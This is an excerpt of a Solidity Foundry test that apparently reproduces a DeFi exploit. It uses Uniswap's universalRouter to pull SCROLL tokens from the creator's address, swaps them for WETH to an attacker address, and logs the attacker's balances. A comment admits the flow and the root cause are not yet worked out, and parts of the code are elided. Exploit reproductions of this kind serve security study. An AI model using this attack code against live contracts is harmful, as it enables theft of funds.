...
contract ContractTest is Test {
    ...
    function testExploit() public {
        console.log("========================================================");
        emit log_named_uint("before attack, we have weth:", WETH.balanceOf(address(this)));
        emit log_named_uint("before attack, we have scroll:", SCROLL.balanceOf(address(this)));
        console.log("========================================================");

        SCROLL.balanceOf(address(universalRouter));
        console.log("1 Scroll balanceOf universalRouter is :",SCROLL.balanceOf(address(universalRouter)));
        bytes memory commands = hex"05";
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(address(SCROLL), address(SCROLL_creater), uint256(1));
        // SCROLL ( SCROLL_creater -> universalRouter)
        universalRouter.execute(commands, inputs);
        SCROLL.balanceOf(address(universalRouter));
        console.log("2 Scroll balanceOf universalRouter is :",SCROLL.balanceOf(address(universalRouter)));

        address[] memory path = new address[](2);
        path[0] = address(SCROLL);
        path[1] = address(WETH);
        uint256[] memory amounts = new uint256[](2);
        console.log("3 Scroll balanceOf universalRouter is :",SCROLL.balanceOf(address(universalRouter)));
        ...
        universalRouter.execute(commands, inputs);
        console.log("4 Scroll balanceOf universalRouter is :",SCROLL.balanceOf(address(universalRouter)));

        SCROLL_WETH_pair.swap(amounts[1], 0, attacker, "");
        WETH.withdraw(WETH.balanceOf(attacker));
        console.log("5 Scroll balanceOf universalRouter is :",SCROLL.balanceOf(address(universalRouter)));

        inputs[0] = abi.encode(address(SCROLL), address(attacker), SCROLL.balanceOf(address(universalRouter)));
        universalRouter.execute(commands, inputs);
        console.log("6 Scroll balanceOf universalRouter is :",SCROLL.balanceOf(address(universalRouter)));

        // TODO:第一个是没有还原整个流程，第二是漏洞原因还没有分析出来

        console.log("========================================================");
        emit log_named_uint("after attack, we have weth:", WETH.balanceOf(address(this)));
        emit log_named_uint("after attack, we have scroll:", SCROLL.balanceOf(address(this)));
        console.log("========================================================");
    }
